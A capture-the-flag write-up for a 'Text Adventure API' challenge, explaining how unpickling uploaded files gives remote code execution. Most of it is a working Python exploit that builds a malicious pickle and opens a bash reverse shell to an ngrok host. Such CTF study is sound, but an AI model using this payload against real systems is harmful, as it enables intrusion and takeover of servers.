# TEXT ADVENTURE API

Challenge Description:

> Explore my kitchen!

> https://text-adventure-api.chall.pwnoh.io/api

## Analyzing the website

The source code at `server.py` have some API's which we can call using curl or other tools. They are used to move to other locations as specified in the `rooms` object as specified in the file. We can also interact with the given objects as well. The important part though is in the `/api/load` API which loads a `.pkl` file and is then unpickled. Unpickling untrusted input is always not good and more information is given in the references if you wish to learn more.

All we have to do is put our payload into a `.pkl` file and call the `/api/load` function with the file as input. This should get us RCE and hopefully a reverse shell.

The below script will the do the job for us. The exploit generates the pickled code and puts it into the `exploit.pkl` file. We then start a netcat listener on any port in our system and map it to a `ngrok tcp` port(In the below case 16648). Once the exploit is uploaded to the server, we should get back a connect and we can cat back the flag.<br>

```python
import pickle
import requests
import os

def delete_exploit_file():
    filename_to_check = 'exploit.pkl'
    if os.path.isfile(filename_to_check):
        try:
            os.remove(filename_to_check)
            print(f"File '{filename_to_check}' has been deleted.")
        except Exception as e:
            print(f"Error deleting '{filename_to_check}': {e}")
    else:
        print(f"File '{filename_to_check}' does not exist in the current directory.")

def get_session():
    url = "https://text-adventure-api.chall.pwnoh.io/api/move"
    headers = {'Content-Type': 'application/json'}
    data = {'exit': 'table'}
    response = requests.post(url, json=data, headers=headers)
    session_cookie = response.cookies.get('session')
    if session_cookie:
        print(f'Session Cookie: {session_cookie}')
        return session_cookie
    else:
        print('Session Cookie not found in response.')

def send_exploit(session_cookie):
    cookies = {'session': f'{session_cookie}'}
    url = "https://text-adventure-api.chall.pwnoh.io/api/load"
    files = {'file': ('exploit.pkl', open('exploit.pkl', 'rb'))}
    response = requests.post(url, files=files, cookies=cookies)

class RCE:
    def __reduce__(self):
        return (os.system, ('/bin/bash -c "/bin/bash -i > /dev/tcp/0.tcp.in.ngrok.io/16648 0>&1 2>&1"',))


delete_exploit_file()
exploit = open('exploit.pkl', 'ab')
pickled = pickle.dump(RCE(), exploit)
exploit.close()

session = get_session()
send_exploit(session)
```

## References

1. https://medium.com/@satyender.yadav/valentine-ctf-pickle-jar-2b92551510db
2. https://davidhamann.de/2020/04/05/exploiting-python-pickle/
3. https://ctftime.org/writeup/36628